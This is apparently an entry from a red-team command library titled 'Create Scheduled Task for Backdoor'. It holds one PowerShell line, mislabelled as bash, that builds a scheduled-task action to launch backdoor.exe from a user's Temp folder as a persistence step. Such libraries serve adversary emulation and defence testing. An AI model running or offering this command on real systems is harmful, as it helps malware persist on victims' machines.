---
id: c6bf2bc6-1dee-4568-b220-6253280fa72e
name: Create Scheduled Task for Backdoor
type: command
executor: bash
data: $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
output: null
created_at: '2023-04-06T03:56:27.837426+00:00'
updated_at: '2023-04-10T20:37:30.438026+00:00'
---

# Create Scheduled Task for Backdoor

```bash
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
```
